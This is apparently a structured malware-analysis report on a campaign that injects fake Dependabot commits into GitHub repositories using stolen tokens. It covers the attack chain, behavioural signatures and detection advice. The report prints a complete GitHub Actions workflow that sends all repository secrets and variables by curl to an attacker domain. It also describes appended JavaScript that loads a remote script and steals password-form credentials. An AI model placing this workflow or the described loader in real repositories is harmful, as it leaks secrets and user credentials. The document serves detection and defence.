package_info.package_name: N/A (malicious GitHub Actions workflow + JS file patching campaign)
package_info.package_versions: N/A (affects all repository versions where the workflow or JS patch is committed)
package_info.why_malicious: The campaign uses stolen GitHub personal access tokens to inject malicious GitHub Actions workflows and patch JavaScript files in hundreds of repositories. The injected code exfiltrates repository secrets and user credentials to an attacker-controlled server, and disguises its commits as coming from Dependabot to evade detection.

malicious_snippets.code_snippet:
name: hook
on: [push]
jobs:
  env:
    runs-on: ubuntu-latest
    steps:
      - name: Run
        env:
          MY_ENV: ${{ toJSON(secrets) }}
          MY_VARS: ${{ toJSON(vars) }}
        run: |
          echo $MY_ENV | curl "https://send.wagateway.pro/webhook" -H "Content-Type: application/json" -d @-
          echo $MY_VARS | curl "https://send.wagateway.pro/webhook" -H "Content-Type: application/json" -d @-
malicious_snippets.code_behavior: On every push event in the repository, the workflow serializes all GitHub secrets and variables, then exfiltrates them via HTTPS POST requests to a hardcoded attacker-controlled domain.

malice_analysis.why_suspicious: This workflow is designed solely to exfiltrate sensitive repository secrets and variables to an external server, which is never a legitimate use case.
malice_analysis.violated_expectations: Normal GitHub Actions workflows automate CI/CD tasks, not exfiltrate secrets. This workflow is maliciously crafted to leak sensitive data.
malice_analysis.similar_legitimate_use: No legitimate workflow should ever send all secrets/variables to an external, non-corporate endpoint.

execution_context.trigger: runtime (browser execution of patched JS files)
execution_context.file_location: All *.js files in the repository (appended line)

malicious_snippets.code_behavior: At runtime in the browser, the appended code injects a new script tag into the page, loading a remote JavaScript payload from hxxps://send.wagateway.pro/client.js?cache=ignore, which is then executed in the user's browser context.

malice_analysis.why_suspicious: The code is obfuscated, appended to all JS files, and loads a remote script from an untrusted domain, which is a classic web supply chain attack pattern.
malice_analysis.violated_expectations: Legitimate JS files should not inject remote scripts from unknown domains, especially in a way that is obfuscated and appended to all files.
malice_analysis.similar_legitimate_use: Dynamic script loading is used in some analytics or feature flag systems, but never in this obfuscated, mass-appended, and unreviewed manner.
key_indicators: Loads remote script from attacker domain

malicious_snippets.code_behavior: When executed in the browser, the code detects password input fields, intercepts form submissions, serializes the entered credentials, and exfiltrates them to the attacker's server before allowing the form to submit normally.

malice_analysis.why_suspicious: Intercepting password form submissions and exfiltrating credentials is a textbook credential-stealing technique.
malice_analysis.violated_expectations: Legitimate scripts should never intercept and exfiltrate user credentials from password forms.
malice_analysis.similar_legitimate_use: Form validation or analytics may hook form submissions, but never to exfiltrate credentials.
key_indicators: Serializes and sends credentials to external server
Runs in all browser contexts where the JS is loaded

attack_chain.action: Attacker obtains developer's GitHub personal access token (likely via a malicious package or environment compromise).
attack_chain.leads_to: Attacker can authenticate as the victim on GitHub.

attack_chain.action: Attacker uses stolen token to push fake Dependabot commits to victim's repositories, adding malicious workflow and patching JS files.
attack_chain.leads_to: Malicious code is present in the repository and will execute on CI/CD and in browsers.

attack_chain.action: On every push, the malicious GitHub Action exfiltrates repository secrets and variables to the attacker's server.
attack_chain.leads_to: Attacker gains access to sensitive repository secrets.

attack_chain.action: When end-users load the compromised JS files in their browsers, the appended code loads a remote script that intercepts password forms and exfiltrates credentials.
attack_chain.leads_to: Attacker receives user credentials submitted via web forms.

behavioral_signatures: New GitHub Actions workflow files that exfiltrate secrets or variables to external domains
Mass modification of *.js files with appended obfuscated code that loads remote scripts
Fake Dependabot or bot-like commit messages for suspicious code changes
Browser JS code that hooks password forms and sends data to unknown endpoints
file_indicators: Any *.js file with appended obfuscated code that injects a script tag
detection_knowledge.how_to_detect: Monitor for new or modified GitHub Actions workflows that POST secrets or variables to external domains. Scan repository JS files for appended obfuscated code that injects remote scripts. Flag commits with bot-like messages that introduce such changes. In browser environments, detect scripts that hook password forms and send data to non-corporate endpoints. Block or alert on network traffic to known malicious domains such as send.wagateway.pro.
